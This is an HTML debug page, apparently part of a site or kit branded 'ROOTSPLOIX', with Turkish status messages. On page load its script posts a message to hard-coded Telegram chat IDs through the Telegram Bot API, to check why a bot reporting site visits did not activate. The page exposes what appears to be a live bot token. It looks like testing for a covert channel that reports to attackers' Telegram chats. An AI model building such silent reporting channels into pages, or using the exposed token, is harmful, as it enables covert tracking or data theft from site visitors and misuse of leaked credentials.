<!DOCTYPE html>
<html>
<head>
    <title>DEBUG MAIN SITE</title>
    <style>
        body { background: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        .debug { border: 1px solid #ff0000; padding: 10px; margin: 10px 0; }
    </style>
</head>
<body>
    <h1>🔥💀 DEBUG MAIN SITE - BOT AKTİFLEŞMEDİ 💀🔥</h1>
    <div id="debug-results"></div>
    
    <script>
        const debug = document.getElementById('debug-results');
        
        function debugLog(msg) {
            const div = document.createElement('div');
            div.className = 'debug';
            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            debug.appendChild(div);
            console.log(msg);
        }
        
        debugLog('🚀 Debug test başlatıldı...');
        
        // Test console errors
        window.addEventListener('error', (e) => {
            debugLog(`❌ JavaScript Error: ${e.message} at ${e.filename}:${e.lineno}`);
        });
        
        // Test telegram connection immediately
        async function immediateTest() {
            debugLog('📡 Telegram bağlantısı test ediliyor...');
            
            try {
                const BOT_TOKEN = '8295691131:AAEJjGLfXEtbHhTyqJ4RC7JFbpGnx_OHthM';
                const CHAT_IDS = ['5312173877', '6633612153'];
                
                const debugMsg = `🔥💀 DEBUG TEST - BOT AKTİFLEŞMEDİ! 💀🔥

LAN SİTEYE GİRDİM BOT AKTİFLEŞMEDİ - DEBUG!

🔧 Problem: Ana site startup mesajı gelmiyor
📡 Test: Manuel telegram bağlantısı
🕒 Zaman: ${new Date().toLocaleString()}

🔍 NEDEN AKTİFLEŞMİYOR?
❓ Framework yükleniyor mu?
❓ Telegram API çalışıyor mu?
❓ DOMContentLoaded tetikleniyor mu?

💀 ROOTSPLOIX DEBUG ACTIVE!`;
                
                for (const chatId of CHAT_IDS) {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: debugMsg
                        })
                    });
                    
                    if (response.ok) {
                        debugLog(`✅ Telegram (${chatId}): ÇALIŞIYOR`);
                    } else {
                        debugLog(`❌ Telegram (${chatId}): HATA ${response.status}`);
                    }
                }
                
            } catch (error) {
                debugLog(`❌ Telegram test failed: ${error.message}`);
            }
        }
        
        // Test DOM ready state
        debugLog(`📄 DOM Ready State: ${document.readyState}`);
        
        // Test if scripts are loaded
        setTimeout(() => {
            debugLog('🔍 Script yükleme kontrolleri:');
            debugLog(`• fetch available: ${typeof fetch !== 'undefined'}`);
            debugLog(`• navigator available: ${typeof navigator !== 'undefined'}`);
            debugLog(`• window.location: ${window.location.href}`);
            
            immediateTest();
        }, 2000);
        
        // Simulate main site load
        debugLog('📋 Ana site framework simülasyonu...');
        
        // Check if main site elements exist
        setTimeout(() => {
            const activation = document.getElementById('rootsploix-activation');
            debugLog(`🎯 Activation button: ${activation ? 'FOUND' : 'NOT FOUND'}`);
            
            if (!activation) {
                debugLog('⚠️ PROBLEM: Ana sitede activation button yok!');
                debugLog('🔧 Çözüm: index.html\'de element ID\'si kontrol et');
            }
        }, 3000);
    </script>
</body>
</html>
